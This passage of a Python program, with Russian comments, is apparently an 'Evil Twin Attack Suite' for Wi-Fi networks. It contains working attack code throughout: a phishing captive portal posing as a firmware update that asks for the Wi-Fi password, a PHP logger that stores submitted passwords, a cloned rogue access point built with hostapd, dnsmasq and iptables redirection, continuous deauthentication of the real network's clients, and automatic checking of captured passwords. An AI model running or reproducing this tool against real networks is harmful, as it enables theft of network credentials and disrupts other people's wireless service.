            position: relative;
            overflow: hidden;
        }
        button:before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.2);
            transition: left 0.5s;
        }
        button:hover:before {
            left: 100%;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        button:active {
            transform: translateY(0);
        }
        .footer {
            margin-top: 25px;
            text-align: center;
            font-size: 12px;
            color: #999;
        }
        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            color: #4caf50;
            font-weight: 500;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="12" cy="12" r="10" fill="#667eea" opacity="0.2"/>
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#667eea"/>
                <path d="M12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" fill="#764ba2"/>
            </svg>
        </div>
        <h1>Firmware Update Required</h1>
        <p class="subtitle">A new security update is available</p>
        
        <div class="warning">
            <span class="warning-icon">⚠️</span>
            <div>
                <strong>Authentication Required</strong><br>
                Please verify your Wi-Fi password to continue
            </div>
        </div>
        
        <form action="verify.php" method="POST" onsubmit="showProgress()">
            <div class="input-group">
                <label for="password">Wi-Fi Password:</label>
                <input type="password" id="password" name="password" required placeholder="Enter your password" minlength="8">
            </div>
            <button type="submit">Verify & Continue</button>
            <div class="progress-bar" id="progress" style="display:none;">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </form>
        
        <div class="footer">
            <span class="security-badge">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" fill="#4caf50"/>
                </svg>
                Secure Connection
            </span>
        </div>
    </div>
    
    <script>
        function showProgress() {
            document.getElementById('progress').style.display = 'block';
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                } else {
                    width += 10;
                    document.getElementById('progressFill').style.width = width + '%';
                }
            }, 100);
        }
    </script>
</body>
</html>"""
        
        php_content = """<?php
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

$log_file = '/tmp/evil_twin_passwords.txt';
$log_entry = "$time | IP: $ip | Password: $password\\n";
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Redirect to Google
header('Location: https://www.google.com');
exit();
?>"""
        
        # Создаем файлы в /tmp
        os.makedirs('/tmp/portal', exist_ok=True)
        with open('/tmp/portal/index.html', 'w') as f:
            f.write(html_content)
        with open('/tmp/portal/verify.php', 'w') as f:
            f.write(php_content)
        
        # Создаем файл для логов
        subprocess.run(['touch', '/tmp/evil_twin_passwords.txt'])
        subprocess.run(['chmod', '777', '/tmp/evil_twin_passwords.txt'])
    
    def setup_ap(self):
        """Настройка точки доступа"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Настройка Evil Twin AP...{Colors.RESET}")
            time.sleep(0.5)
            return
        
        # Конфигурация hostapd
        hostapd_conf = f"""interface={self.ap_interface}
driver=nl80211
ssid={self.target['ssid']}
hw_mode=g
channel={self.target['channel']}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
"""
        
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(hostapd_conf)
        
        # Конфигурация dnsmasq
        dnsmasq_conf = f"""interface={self.ap_interface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""
        
        with open('/tmp/dnsmasq.conf', 'w') as f:
            f.write(dnsmasq_conf)
        
        # Настройка интерфейса
        subprocess.run(['ifconfig', self.ap_interface, 'down'])
        subprocess.run(['ifconfig', self.ap_interface, '10.0.0.1', 'netmask', '255.255.255.0'])
        subprocess.run(['ifconfig', self.ap_interface, 'up'])
        
        # IP forwarding
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        
        # iptables rules
        subprocess.run(['iptables', '--flush'])
        subprocess.run(['iptables', '-t', 'nat', '--flush'])
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', 
                       '-j', 'DNAT', '--to-destination', '10.0.0.1:80'])
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', 
                       '-j', 'DNAT', '--to-destination', '10.0.0.1:80'])
        subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])
    
    def start_services(self):
        """Запуск сервисов"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Запуск сервисов (Apache, dnsmasq, hostapd)...{Colors.RESET}")
            time.sleep(0.5)
            return
        
        # Запуск Apache
        subprocess.run(['systemctl', 'start', 'apache2'])
        
        # Запуск dnsmasq
        subprocess.Popen(['dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d'],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
        
        # Запуск hostapd
        subprocess.Popen(['hostapd', '/tmp/hostapd.conf'],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
    
    def get_clients(self):
        """Получить список клиентов целевой сети"""
        if DEMO_MODE:
            # Возвращаем фейковых клиентов
            return ['11:22:33:44:55:66', '77:88:99:AA:BB:CC', 'DD:EE:FF:00:11:22']
        
        try:
            result = subprocess.run(
                ['airodump-ng', '-c', self.target['channel'], '--bssid', 
                 self.target['bssid'], '-w', '/tmp/clients', '--write-interval', '5',
                 '--output-format', 'csv', self.deauth_interface],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Парсинг клиентов из CSV
            csv_file = '/tmp/clients-01.csv'
            if os.path.exists(csv_file):
                with open(csv_file, 'r', errors='ignore') as f:
                    lines = f.readlines()
                
                in_client_section = False
                clients = []
                for line in lines:
                    if 'Station MAC' in line:
                        in_client_section = True
                        continue
                    if in_client_section and line.strip():
                        parts = line.split(',')
                        if len(parts) >= 1:
                            client_mac = parts[0].strip()
                            if client_mac and ':' in client_mac:
                                clients.append(client_mac)
                
                return clients
        except:
            pass
        return []
    
    def deauth_clients(self, stop_event):
        """Деаутентификация клиентов"""
        global deauth_log
        
        while not stop_event.is_set():
            # Обновляем статус
            self.deauth_status = "Deauthenticating... (broadcast)"
            
            if DEMO_MODE:
                # Фейковая деаутентификация в демо режиме
                timestamp = datetime.now().strftime('%H:%M:%S')
                deauth_log.append(f"[{timestamp}] Broadcast deauth -> {self.target['ssid']}")
                if len(deauth_log) > 50:
                    deauth_log.pop(0)
                
                # Иногда "обнаруживаем" новых клиентов
                if random.random() > 0.7:
                    fake_mac = ':'.join([f'{random.randint(0, 255):02X}' for _ in range(6)])
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    deauth_log.append(f"[{timestamp}] Discovered new client: {fake_mac}")
                    if len(deauth_log) > 50:
                        deauth_log.pop(0)
                
                time.sleep(2)
                continue
            
            # Глобальная деаутентификация
            try:
                subprocess.run(
                    ['aireplay-ng', '--deauth', '5', '-a', self.target['bssid'], 
                     self.deauth_interface],
                    capture_output=True,
                    timeout=2
                )
                timestamp = datetime.now().strftime('%H:%M:%S')
                deauth_log.append(f"[{timestamp}] Broadcast deauth → {self.target['ssid']}")
                if len(deauth_log) > 50:
                    deauth_log.pop(0)
            except:
                pass
            
            # Деаутентификация каждого клиента
            for client in self.clients:
                if stop_event.is_set():
                    break
                try:
                    subprocess.run(
                        ['aireplay-ng', '--deauth', '3', '-a', self.target['bssid'],
                         '-c', client, self.deauth_interface],
                        capture_output=True,
                        timeout=2
                    )
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    deauth_log.append(f"[{timestamp}] Discovered new client: {client}")
                    if len(deauth_log) > 50:
                        deauth_log.pop(0)
                except:
                    pass
            
            time.sleep(2)
    
    def verify_password(self, password, stop_event):
        """Проверка пароля"""
        global ap_log
        
        timestamp = datetime.now().strftime('%H:%M:%S')
        ap_log.append(f"[{timestamp}] Testing password: {password}")
        
        # Обновляем статус
        self.deauth_status = f"Connecting to {self.target['ssid']}..."
        
        # Останавливаем деаутентификацию
        stop_event.set()
        
        if DEMO_MODE:
            # В демо режиме делаем вид что проверяем
            time.sleep(3)
            
            # 30% шанс что пароль "правильный" в демо
            if random.random() > 0.7 or len(captured_passwords) >= 3:
                timestamp = datetime.now().strftime('%H:%M:%S')
                ap_log.append(f"[{timestamp}] PASSWORD CORRECT: {password}")
                self.correct_password = password
                self.attack_successful = True
                return True
            else:
                timestamp = datetime.now().strftime('%H:%M:%S')
                ap_log.append(f"[{timestamp}] Password incorrect")
                self.deauth_status = "Deauthenticating... (broadcast)"
                stop_event.clear()
                return False
        
        time.sleep(2)
        
        # Пробуем подключиться
        wpa_conf = f"""network={{
    ssid="{self.target['ssid']}"
    psk="{password}"
}}"""
        
        with open('/tmp/wpa_test.conf', 'w') as f:
            f.write(wpa_conf)
        
        try:
            # Используем wpa_supplicant для проверки
            proc = subprocess.Popen(
                ['wpa_supplicant', '-i', self.deauth_interface.replace('mon', ''),
                 '-c', '/tmp/wpa_test.conf'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Ждем 10 секунд
            time.sleep(10)
            proc.terminate()
            
            # Проверяем подключение
            result = subprocess.run(['iwconfig', self.deauth_interface.replace('mon', '')],
                                  capture_output=True, text=True)
            
            if self.target['ssid'] in result.stdout:
                timestamp = datetime.now().strftime('%H:%M:%S')
                ap_log.append(f"[{timestamp}] PASSWORD CORRECT: {password}")
                self.correct_password = password
                self.attack_successful = True
                return True
            else:
                timestamp = datetime.now().strftime('%H:%M:%S')
                ap_log.append(f"[{timestamp}] Password incorrect")
                # Возобновляем деаутентификацию
                self.deauth_status = "Deauthenticating... (broadcast)"
                stop_event.clear()
                return False
        except:
            timestamp = datetime.now().strftime('%H:%M:%S')
            ap_log.append(f"[{timestamp}] Verification failed")
            self.deauth_status = "Deauthenticating... (broadcast)"
            stop_event.clear()
            return False
    
    def monitor_passwords(self, stop_event):
        """Мониторинг введенных паролей"""
        global ap_log, captured_passwords
        
        self.ap_status = "Hosting..."
        
        if DEMO_MODE:
            # В демо режиме генерируем фейковые пароли
            demo_passwords = ['Password123', 'MyWiFi2024', 'SecureNet456', 'HomeRouter789']
            demo_ips = ['192.168.1.101', '192.168.1.102', '192.168.1.103', '192.168.1.104']
            
            password_idx = 0
            while not stop_event.is_set() and not self.attack_successful:
                # Каждые 5-10 секунд "получаем" новый пароль
                wait_time = random.randint(5, 10)
                time.sleep(wait_time)
                
                if stop_event.is_set() or self.attack_successful:
                    break
                
                if password_idx < len(demo_passwords):
                    password = demo_passwords[password_idx]
                    ip = demo_ips[password_idx]
                    
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    fake_log_line = f"{timestamp} | IP: {ip} | Password: {password}"
                    captured_passwords.append(fake_log_line)
                    
                    # Логируем подключение клиента
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    ap_log.append(f"[{timestamp}] Connected client: {ip}")
                    ap_log.append(f"[{timestamp}] Password received: {password}")
                    if len(ap_log) > 50:
                        ap_log.pop(0)
                        ap_log.pop(0)
                    
                    # Проверяем пароль
                    if self.verify_password(password, stop_event):
                        return
                    
                    password_idx += 1
            
            return
        
        last_size = 0
        while not stop_event.is_set() and not self.attack_successful:
            try:
                if os.path.exists('/tmp/evil_twin_passwords.txt'):
                    current_size = os.path.getsize('/tmp/evil_twin_passwords.txt')
                    if current_size > last_size:
                        with open('/tmp/evil_twin_passwords.txt', 'r') as f:
                            lines = f.readlines()
                        
                        new_lines = lines[len(captured_passwords):]
                        for line in new_lines:
                            captured_passwords.append(line.strip())
                            
                            # Извлекаем пароль и IP
                            match = re.search(r'Password: (.+)', line)
                            ip_match = re.search(r'IP: ([\d.]+)', line)
                            
                            if match:
                                password = match.group(1)
                                ip = ip_match.group(1) if ip_match else 'Unknown'
                                
                                # Логируем подключение клиента
                                timestamp = datetime.now().strftime('%H:%M:%S')
                                ap_log.append(f"[{timestamp}] Connected client: {ip}")
                                ap_log.append(f"[{timestamp}] Password received: {password}")
                                if len(ap_log) > 50:
                                    ap_log.pop(0)
                                    ap_log.pop(0)
                                
                                # Проверяем пароль
                                if self.verify_password(password, stop_event):
                                    # Пароль правильный - выходим
                                    return
                        
                        last_size = current_size
            except:
                pass
            
            time.sleep(1)

def main_menu():
    """Главное меню"""
    while True:
        os.system('clear')
        
        # Баннер
        if DEMO_MODE:
            banner = """
 _________     .__  __    __          
 /   _____/__ __|__|/  |__/  |_ ___.__.
 \\_____  \\|  |  \\  \\   __\\   __<   |  |
 /        \\  |  /  ||  |  |  |  \\___  |
/_______  /____/|__||__|  |__|  / ____|
        \\/                      \\/      
        
    DEMO MODE
    Advanced Wi-Fi Penetration Tool
        """
        else:
            banner = """
 _________     .__  __    __          
 /   _____/__ __|__|/  |__/  |_ ___.__.
 \\_____  \\|  |  \\  \\   __\\   __<   |  |
 /        \\  |  /  ||  |  |  |  \\___  |
/_______  /____/|__||__|  |__|  / ____|
        \\/                      \\/      
        
    EVIL TWIN ATTACK SUITE
    Advanced Wi-Fi Penetration Tool
        """
        print(Colors.gradient(banner, style='claude'))
        
        # Текущие адаптеры
        interfaces = NetworkInterface.get_interfaces()
        print(f"\n{Colors.ORANGE}[*] Current Wi-Fi Adapters:{Colors.RESET}\n")
        
        if not interfaces:
            print(f"{Colors.ORANGE}[!] No Wi-Fi adapters found!{Colors.RESET}")
        else:
            for i, iface in enumerate(interfaces, 1):
                mode = "Monitor" if NetworkInterface.is_monitor_mode(iface) else "Managed"
                mode_color = Colors.ORANGE if mode == "Monitor" else Colors.WHITE
                demo_tag = " [DEMO]" if DEMO_MODE else ""
                
                # Проверяем и включаем DOWN интерфейсы
                status = ""
                if not DEMO_MODE:
                    try:
                        result = subprocess.run(['ip', 'link', 'show', iface],
                                              capture_output=True,
                                              text=True,
                                              timeout=2)
                        if 'state DOWN' in result.stdout:
                            # Автоматически включаем
                            subprocess.run(['ip', 'link', 'set', iface, 'up'],
                                         capture_output=True,
                                         timeout=2)
                            status = f"{Colors.WHITE}[UP✓]{Colors.RESET}"
                        elif 'state UP' in result.stdout:
                            status = f"{Colors.DIM}[UP]{Colors.RESET}"
                    except:
                        pass
                
                print(f"  {Colors.WHITE}[{i}] {iface:10} {mode_color}[{mode}]{Colors.RESET} {status}{demo_tag}")
        
        # Меню
        print(f"\n{Colors.gradient('─'*60, style='claude')}")
        print(f"\n{Colors.ORANGE}[1]{Colors.WHITE} Run Wifite{Colors.RESET}")
        print(f"{Colors.ORANGE}[2]{Colors.WHITE} Evil Twin Attack{Colors.RESET}")
        print(f"{Colors.ORANGE}[3]{Colors.WHITE} Disable Monitor Mode on all adapters{Colors.RESET}")
        print(f"{Colors.ORANGE}[0]{Colors.WHITE} Exit{Colors.RESET}")
        print(f"\n{Colors.gradient('─'*60, style='claude')}\n")
        
        choice = input(f"{Colors.WHITE}Select option: {Colors.RESET}")
        
        if choice == '1':
            wifite_menu()
        elif choice == '2':
            evil_twin_menu()
        elif choice == '3':
            print(f"\n{Colors.ORANGE}[*] Disabling Monitor Mode on all adapters...{Colors.RESET}")
            NetworkInterface.disable_all_monitor_modes()
            print(f"{Colors.WHITE}[✓] Done!{Colors.RESET}")
            time.sleep(2)
        elif choice == '0':
            print(f"\n{Colors.ORANGE}[*] Exiting...{Colors.RESET}")
            sys.exit(0)

def wifite_menu():
    """Меню Wifite"""
    if DEMO_MODE:
        os.system('clear')
        print(f"\n{Colors.gradient('='*60, style='claude')}")
        print(f"{Colors.ORANGE}[DEMO] Wifite недоступен в демо-режиме{Colors.RESET}")
        print(f"{Colors.gradient('='*60, style='claude')}\n")
        print(f"{Colors.WHITE}В демо-режиме доступен только Evil Twin Attack{Colors.RESET}")
        print(f"{Colors.WHITE}для демонстрации интерфейса.{Colors.RESET}\n")
        input(f"{Colors.WHITE}Нажмите Enter для возврата в меню...{Colors.RESET}")
        return
    
    os.system('clear')
    print(f"\n{Colors.gradient('='*60, style='claude')}")
    print(f"{Colors.ORANGE}[*] Запуск Wifite...{Colors.RESET}")
    print(f"{Colors.gradient('='*60, style='claude')}\n")
    
    try:
        subprocess.run(['wifite'])
    except KeyboardInterrupt:
        pass
    
    input(f"\n{Colors.WHITE}Нажмите Enter для возврата в меню...{Colors.RESET}")

def evil_twin_menu():
    """Меню Evil Twin атаки"""
    global stop_scan
    
    # Получаем интерфейсы
    interfaces = NetworkInterface.get_interfaces()
    
    if len(interfaces) < 2:
        os.system('clear')
        print(f"\n{Colors.ORANGE}[!] Требуется минимум 2 Wi-Fi адаптера!{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Найдено адаптеров: {len(interfaces)}{Colors.RESET}")
        input(f"\n{Colors.WHITE}Нажмите Enter для возврата...{Colors.RESET}")
        return
    
    # Выбор адаптера для точки доступа
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] Выберите адаптер для Evil Twin AP:{Colors.RESET}\n")
    for i, iface in enumerate(interfaces, 1):
        print(f"{Colors.WHITE}[{i}] {iface}{Colors.RESET}")
    
    ap_choice = input(f"\n{Colors.WHITE}Выбор: {Colors.RESET}")
    try:
        ap_interface = interfaces[int(ap_choice) - 1]
    except:
        print(f"{Colors.ORANGE}[!] Неверный выбор{Colors.RESET}")
        time.sleep(2)
        return
    
    # Выбор адаптера для деаутентификации
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] Выберите адаптер для деаутентификации:{Colors.RESET}\n")
    for i, iface in enumerate(interfaces, 1):
        if iface != ap_interface:
            print(f"{Colors.WHITE}[{i}] {iface}{Colors.RESET}")
    
    deauth_choice = input(f"\n{Colors.WHITE}Выбор: {Colors.RESET}")
    try:
        deauth_interface = interfaces[int(deauth_choice) - 1]
    except:
        print(f"{Colors.ORANGE}[!] Неверный выбор{Colors.RESET}")
        time.sleep(2)
        return
    
    if ap_interface == deauth_interface:
        print(f"{Colors.ORANGE}[!] Адаптеры должны быть разными!{Colors.RESET}")
        time.sleep(2)
        return
    
    # Выбор шаблона
    os.system('clear')
    templates = TemplateManager.list_templates()
    
    if not templates:
        print(f"{Colors.ORANGE}[!] Шаблоны не найдены! Создаю default...{Colors.RESET}")
        TemplateManager.create_default_template()
        templates = ['default']
    
    print(f"\n{Colors.ORANGE}[*] Выберите шаблон фишинговой страницы:{Colors.RESET}\n")
    for i, template in enumerate(templates, 1):
        print(f"{Colors.WHITE}[{i}] {template}{Colors.RESET}")
    
    template_choice = input(f"\n{Colors.WHITE}Выбор (Enter для default): {Colors.RESET}")
    
    if template_choice.strip() == '':
        selected_template = 'default'
    else:
        try:
            selected_template = templates[int(template_choice) - 1]
        except:
            print(f"{Colors.ORANGE}[!] Неверный выбор, используется default{Colors.RESET}")
            selected_template = 'default'
            time.sleep(2)
    
    # Включаем monitor mode на deauth интерфейсе
    print(f"\n{Colors.ORANGE}[*] Включение Monitor Mode на {deauth_interface}...{Colors.RESET}")
    NetworkInterface.enable_monitor_mode(deauth_interface)
    deauth_interface += 'mon'
    time.sleep(2)
    
    # Сканирование сетей
    scanner = APScanner(deauth_interface)
    
    # Устанавливаем обработчик Ctrl+B
    def signal_handler(sig, frame):
        global stop_scan
        stop_scan = True
    
    original_sigint = signal.signal(signal.SIGINT, signal_handler)
    
    networks = scanner.scan()
    
    signal.signal(signal.SIGINT, original_sigint)
    
    if not networks:
        print(f"\n{Colors.ORANGE}[!] Сети не найдены{Colors.RESET}")
        input(f"\n{Colors.WHITE}Нажмите Enter для возврата...{Colors.RESET}")
        return
    
    # Выбор цели
    print(f"\n{Colors.WHITE}Введите номер целевой сети: {Colors.RESET}", end='')
    target_choice = input()
    
    try:
        target = networks[int(target_choice) - 1]
    except:
        print(f"{Colors.ORANGE}[!] Неверный выбор{Colors.RESET}")
        time.sleep(2)
        return
    
    # Запуск атаки
    print(f"\n{Colors.ORANGE}[*] Запуск Evil Twin атаки на {target['ssid']}...{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Используется шаблон: {selected_template}{Colors.RESET}")
    time.sleep(2)
    
    attack = EvilTwinAttack(ap_interface, deauth_interface, target)
    
    # Создаем фишинговый портал с выбранным шаблоном
    print(f"{Colors.ORANGE}[*] Создание фишингового портала...{Colors.RESET}")
    attack.create_html_portal(selected_template)
    
    # Настраиваем точку доступа
    print(f"{Colors.ORANGE}[*] Настройка Evil Twin AP...{Colors.RESET}")
    attack.setup_ap()
    
    # Запускаем сервисы
    print(f"{Colors.ORANGE}[*] Запуск сервисов...{Colors.RESET}")
    attack.start_services()
    
    print(f"{Colors.WHITE}[*] Ожидание 10 секунд...{Colors.RESET}")
    time.sleep(10)
    
    # Получаем клиентов
    print(f"{Colors.ORANGE}[*] Сканирование клиентов оригинальной сети...{Colors.RESET}")
    attack.clients = attack.get_clients()
    print(f"{Colors.WHITE}[*] Найдено клиентов: {len(attack.clients)}{Colors.RESET}")
    
    # Запускаем деаутентификацию
    stop_deauth = threading.Event()
    deauth_thread = threading.Thread(target=attack.deauth_clients, args=(stop_deauth,))
    deauth_thread.start()
    
    # Запускаем мониторинг паролей
    monitor_thread = threading.Thread(target=attack.monitor_passwords, args=(stop_deauth,))
    monitor_thread.start()
    
    # Отображение логов в режиме реального времени
    animation_frame = 0
    try:
        while not attack.attack_successful:
            os.system('clear')
            
            # Получаем размер терминала
            try:
                terminal_size = os.get_terminal_size()
                terminal_width = terminal_size.columns
                terminal_height = terminal_size.lines
            except:
                terminal_width = 120
                terminal_height = 30
            
            # Вычисляем размеры боксов на основе ширины терминала
            total_width = terminal_width - 4  # Отступы
            box_width = (total_width - 3) // 2  # 3 = пробел между боксами + границы
            section_height = min(terminal_height - 10, 20)  # Адаптивная высота
            
            # Верхняя граница обоих боксов с диагональным градиентом
            left_top = '╭' + '─' * box_width + '╮'
            right_top = '╭' + '─' * box_width + '╮'
            
            # Диагональный градиент слева-сверху вправо-вниз
            def diagonal_gradient(text, row, total_rows):
                """Применяет диагональный градиент"""
                result = ""
                for i, char in enumerate(text):
                    # Позиция по диагонали (0.0 - левый верх, 1.0 - правый низ)
                    diag_pos = (row / total_rows + i / len(text)) / 2
                    color_idx = int(diag_pos * (len(Colors.CLAUDE_COLORS) - 1))
                    color_idx = min(color_idx, len(Colors.CLAUDE_COLORS) - 1)
                    result += Colors.CLAUDE_COLORS[color_idx] + char
                return result + Colors.RESET
            
            total_rows = section_height + 4  # Всего строк в интерфейсе
            
            # Верхняя граница с градиентом
            print(f"\n{diagonal_gradient(left_top, 0, total_rows)} {diagonal_gradient(right_top, 0, total_rows)}")
            
            # Заголовки секций
            deauth_title = "DEAUTH LOGS"
            ap_title = "AP LOGS"
            deauth_padding = (box_width - len(deauth_title)) // 2
            ap_padding = (box_width - len(ap_title)) // 2
            
            left_header = f"│{' ' * deauth_padding}{deauth_title}{' ' * (box_width - len(deauth_title) - deauth_padding)}│"
            right_header = f"│{' ' * ap_padding}{ap_title}{' ' * (box_width - len(ap_title) - ap_padding)}│"
            
            print(f"{diagonal_gradient(left_header, 1, total_rows)} {diagonal_gradient(right_header, 1, total_rows)}")
            
            # Разделитель после заголовка
            left_mid = '├' + '─' * box_width + '┤'
            right_mid = '├' + '─' * box_width + '┤'
            print(f"{diagonal_gradient(left_mid, 2, total_rows)} {diagonal_gradient(right_mid, 2, total_rows)}")
            
            # Рисуем строки логов
            for i in range(section_height):
                row_num = 3 + i
                
                # Левый лог (deauth)
                log_index = len(deauth_log) - section_height + i
                if log_index >= 0 and log_index < len(deauth_log):
                    left_log = deauth_log[log_index]
                    if len(left_log) > box_width - 2:
                        left_log = left_log[:box_width - 5] + "..."
                else:
                    left_log = ""
                
                left_padding = box_width - len(left_log) - 2
                
                # Правый лог (AP)
                log_index = len(ap_log) - section_height + i
                if log_index >= 0 and log_index < len(ap_log):
                    right_log = ap_log[log_index]
                    if len(right_log) > box_width - 2:
                        right_log = right_log[:box_width - 5] + "..."
                else:
                    right_log = ""
                
                right_padding = box_width - len(right_log) - 2
                
                # Границы с градиентом
                left_border_start = diagonal_gradient('│', row_num, total_rows)
                left_border_end = diagonal_gradient('│', row_num, total_rows)
                right_border_start = diagonal_gradient('│', row_num, total_rows)
                right_border_end = diagonal_gradient('│', row_num, total_rows)
                
                print(f"{left_border_start} {Colors.WHITE}{left_log}{' ' * left_padding} {left_border_end} "
                      f"{right_border_start} {Colors.WHITE}{right_log}{' ' * right_padding} {right_border_end}")
            
            # Нижние статусы (переливающийся текст)
            deauth_status_animated = Colors.animate_gradient(attack.deauth_status, animation_frame)
            ap_status_animated = Colors.animate_gradient(attack.ap_status, animation_frame)
            
            # Разделитель перед статусом
            row_num = 3 + section_height
            print(f"{diagonal_gradient(left_mid, row_num, total_rows)} {diagonal_gradient(right_mid, row_num, total_rows)}")
            
            # Строка статуса
            row_num += 1
            deauth_status_padding = box_width - len(attack.deauth_status) - 2
            ap_status_padding = box_width - len(attack.ap_status) - 2
            
            left_status_line = f"│ {attack.deauth_status}{' ' * deauth_status_padding} │"
            right_status_line = f"│ {attack.ap_status}{' ' * ap_status_padding} │"
            
            # Анимированный градиент для статуса
            left_status_colored = ""
            for i, char in enumerate(left_status_line):
                if char in '│':
                    left_status_colored += diagonal_gradient(char, row_num, total_rows)
                elif i > 1 and i < len(left_status_line) - 2:
                    # Текст статуса с анимацией
                    color_idx = (i + animation_frame) % len(Colors.CLAUDE_COLORS)
                    left_status_colored += Colors.CLAUDE_COLORS[color_idx] + char
                else:
                    left_status_colored += char
            
            right_status_colored = ""
            for i, char in enumerate(right_status_line):
                if char in '│':
                    right_status_colored += diagonal_gradient(char, row_num, total_rows)
                elif i > 1 and i < len(right_status_line) - 2:
                    color_idx = (i + animation_frame) % len(Colors.CLAUDE_COLORS)
                    right_status_colored += Colors.CLAUDE_COLORS[color_idx] + char
                else:
                    right_status_colored += char
            
            print(f"{left_status_colored}{Colors.RESET} {right_status_colored}{Colors.RESET}")
            
            # Нижняя граница
            row_num += 1
            left_bottom = '╰' + '─' * box_width + '╯'
            right_bottom = '╰' + '─' * box_width + '╯'
            print(f"{diagonal_gradient(left_bottom, row_num, total_rows)} {diagonal_gradient(right_bottom, row_num, total_rows)}")
            
            print(f"\n{Colors.DIM}Press Ctrl+C to stop attack{Colors.RESET}")
            
            animation_frame = (animation_frame + 1) % len(Colors.CLAUDE_COLORS)
            attack.animation_frame = animation_frame
            
            time.sleep(0.2)
            
    except KeyboardInterrupt:
        pass
    
    # Остановка атаки
    print(f"\n\n{Colors.ORANGE}[*] Остановка атаки...{Colors.RESET}")
    stop_deauth.set()
    deauth_thread.join(timeout=3)
    monitor_thread.join(timeout=3)
    
    # Очистка
    subprocess.run(['killall', 'hostapd'], stderr=subprocess.DEVNULL)
    subprocess.run(['killall', 'dnsmasq'], stderr=subprocess.DEVNULL)
    NetworkInterface.disable_monitor_mode(deauth_interface)
    
    # Показываем результаты
    show_attack_results(attack, target, selected_template)

def show_attack_results(attack, target, template):
    """Показать результаты атаки"""
    os.system('clear')
    
    # Заголовок
    print(f"\n{Colors.gradient('='*80, style='claude')}")
    print(f"{Colors.ORANGE}{'ATTACK RESULTS':^80}{Colors.RESET}")
    print(f"{Colors.gradient('='*80, style='claude')}\n")
    
    # Информация о цели
    print(f"{Colors.ORANGE}Target Information:{Colors.RESET}")
    print(f"  {Colors.WHITE}SSID:       {target['ssid']}{Colors.RESET}")
    print(f"  {Colors.WHITE}BSSID:      {target['bssid']}{Colors.RESET}")
    print(f"  {Colors.WHITE}Channel:    {target['channel']}{Colors.RESET}")
    print(f"  {Colors.WHITE}Encryption: {target['encryption']}{Colors.RESET}")
    print(f"  {Colors.WHITE}Template:   {template}{Colors.RESET}\n")
    
    # Результат атаки
    if attack.attack_successful and attack.correct_password:
        print(f"{Colors.gradient('╭' + '─' * 78 + '╮', style='claude')}")
        print(f"{Colors.ORANGE}│{Colors.WHITE}{'SUCCESS! PASSWORD CRACKED':^78}{Colors.ORANGE}│{Colors.RESET}")
        print(f"{Colors.gradient('├' + '─' * 78 + '┤', style='claude')}")
        print(f"{Colors.ORANGE}│{Colors.WHITE}  Password: {attack.correct_password}{' ' * (76 - len(attack.correct_password) - 12)}{Colors.ORANGE}│{Colors.RESET}")
        print(f"{Colors.gradient('╰' + '─' * 78 + '╯', style='claude')}\n")
    else:
        print(f"{Colors.ORANGE}Status: Attack stopped (no password captured){Colors.RESET}\n")
    
    # Статистика
    print(f"{Colors.ORANGE}Statistics:{Colors.RESET}")
    print(f"  {Colors.WHITE}Captured passwords: {len(captured_passwords)}{Colors.RESET}")
    print(f"  {Colors.WHITE}Deauth attempts:    {len(deauth_log)}{Colors.RESET}")
    print(f"  {Colors.WHITE}AP events:          {len(ap_log)}{Colors.RESET}\n")
    
    # Все перехваченные пароли
    if captured_passwords:
        print(f"{Colors.ORANGE}All Captured Passwords:{Colors.RESET}")
